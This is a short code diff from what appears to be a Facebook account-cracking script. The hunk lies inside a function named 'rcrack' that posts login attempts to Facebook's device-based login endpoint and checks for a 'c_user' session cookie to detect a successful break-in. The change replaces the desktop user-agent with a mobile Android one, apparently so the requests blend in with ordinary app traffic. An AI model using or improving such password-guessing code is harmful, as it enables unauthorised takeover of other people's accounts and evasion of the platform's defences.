@@ -284,7 +284,7 @@ def rcrack(uid,pwx,tl):
             "priority": 'u=0',
             'cross-origin-resource-policy': 'cross-origin',
             "upgrade-insecure-requests": '1',
-            "user-agent": 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',}
+            "user-agent": 'Mozilla/5.0 (Linux; Android 10; CPH1881 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36',}
             lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
